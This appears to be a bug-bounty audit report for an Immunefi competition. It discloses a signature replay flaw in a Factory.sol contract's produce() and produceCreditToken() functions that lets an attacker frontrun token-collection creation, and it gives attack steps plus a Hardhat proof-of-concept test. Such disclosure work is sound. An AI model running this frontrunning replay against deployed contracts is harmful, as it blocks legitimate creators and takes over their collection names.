# 57580 sc medium signature replay enables frontrunning of produce producecredittoken

**Submitted on Oct 27th 2025 at 10:40:27 UTC by @DoD4uFN for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57580
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/Factory.sol>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### Brief/Intro

Both the `produce()` and `produceCreditToken()` functions in `Factory.sol` allow users to create new token collections (AccessToken and CreditToken, respectively) after obtaining a valid signature from the platform’s signer. However, the signature verification does not bind the signature to the caller, allowing anyone to reuse a valid signature meant for another user.

As a result, a malicious actor can front-run legitimate creation transactions and deploy the same collection before the rightful creator, permanently blocking them from using the same `name` and `symbol`, which are unique identifiers across the platform.

### Vulnerability Details

Both `produce()` and `produceCreditToken()` rely on EIP-712/ECDSA signature validation to ensure the platform authorizes a collection’s metadata. However, neither the `checkAccessTokenInfo()` nor `checkCreditTokenInfo()` functions include the creator’s address in the signed payload. This omission means that a valid signature is reusable by anyone, making it possible for an attacker to frontrun a legitimate user’s collection creation and deploy it under their own address.

For example, in `produce()`:

```solidity
factoryParameters.signerAddress.checkAccessTokenInfo(accessTokenInfo);
...
bytes32 hashedSalt = _metadataHash(accessTokenInfo.metadata.name, accessTokenInfo.metadata.symbol);
require(getNftInstanceInfo[hashedSalt].nftAddress == address(0), TokenAlreadyExists());
```

and similarly in `produceCreditToken()`:

```solidity
_nftFactoryParameters.signerAddress.checkCreditTokenInfo(signature, creditTokenInfo);
...
bytes32 hashedSalt = _metadataHash(creditTokenInfo.name, creditTokenInfo.symbol);
require(_creditTokenInstanceInfo[hashedSalt].creditToken == address(0), TokenAlreadyExists());
```

In both functions, the deterministic salt is defined as:

```solidity
function _metadataHash(string memory name, string memory symbol) private pure returns (bytes32) {
    return keccak256(abi.encode(name, symbol));
}
```

Since the salt is derived solely from `name` and `symbol`, and uniqueness is enforced via `TokenAlreadyExists()`, the first entity to call the function with a given `(name, symbol)` pair “locks” that pair forever.

### Impact Details

This vulnerability enables signature replay and collection identity theft across both AccessToken (ERC721) and CreditToken (ERC1155) deployments.

While direct fund loss is not immediate, the exploit effectively breaks creator authorization guarantees the signature mechanism is intended to enforce.

## References

* Factory.sol:produce\
  <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/Factory.sol#L236-L240>
* Factory.sol:produceCreditToken\
  <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/Factory.sol#L306-L310>
* SignatureVerifier.sol\
  <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/utils/SignatureVerifier.sol#L49-L99>
* Factory.sol:\_metadataHash\
  <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/Factory.sol#L507>

## Proof of Concept

### Steps

{% stepper %}
{% step %}

### Step 1

Alice obtains a valid signature from the factory’s signer for creating a new collection:

* name = "CoolCats"
* symbol = "CCAT"
  {% endstep %}

{% step %}

### Step 2

Alice prepares a transaction calling:

```solidity
Factory.produce(accessTokenInfo, referralCode)
```

{% endstep %}

{% step %}

### Step 3

An attacker monitors the mempool, copies Alice’s transaction data, and resubmits it first with a higher gas price.
{% endstep %}

{% step %}

### Step 4

Since `msg.sender` is not part of the signed payload, the contract accepts the attacker’s transaction as valid.
{% endstep %}

{% step %}

### Step 5

The attacker’s transaction deploys the collection first, occupying the salt `(CoolCats, CCAT)`.
{% endstep %}

{% step %}

### Step 6

When Alice’s transaction executes, it reverts with `TokenAlreadyExists()`.
{% endstep %}

{% step %}

### Step 7

The attacker has effectively stolen the collection name/symbol pair and blocked Alice’s deployment permanently.
{% endstep %}
{% endstepper %}

### Proof of Concept (code)

Should be added in `factory.tests.ts` @ `Deploy AccessToken`:

```typescript
it('Deploy AccessToken Griefing Immunefi POC', async () => {
  const { signatureVerifier, factory, validator, alice, bob, signer } = await loadFixture(fixture);

  const nftName = 'CoolCats';
  const nftSymbol = 'CCAT';
  const contractURI = 'contractURI/AccessToken123';
  const price = ethers.utils.parseEther('0.05');
  const feeNumerator = 500;

  const message = hashAccessTokenInfo(nftName, nftSymbol, contractURI, feeNumerator, chainId);
  const signature = EthCrypto.sign(signer.privateKey, message);
  const info: AccessTokenInfoStruct = {
    metadata: { name: nftName, symbol: nftSymbol },
    contractURI: contractURI,
    paymentToken: NATIVE_CURRENCY_ADDRESS,
    mintPrice: price,
    whitelistMintPrice: price,
    transferable: true,
    maxTotalSupply: BigNumber.from('1000'),
    feeNumerator,
    collectionExpire: BigNumber.from('86400'),
    signature: signature,
  };

  // alice calls produce, but bob frontruns alice
  // const txAlice = await factory.connect(alice).produce(info, ethers.constants.HashZero);
 
  // bob's transaction gets included first
  const txBob = await factory.connect(bob).produce(info, ethers.constants.HashZero);
  await expect(txBob).to.emit(factory, 'AccessTokenCreated');

  // alice's transaction gets reverted
  await expect(factory.connect(alice).produce(info, ethers.constants.HashZero)).to.be.revertedWithCustomError(factory, 'TokenAlreadyExists');
});
```
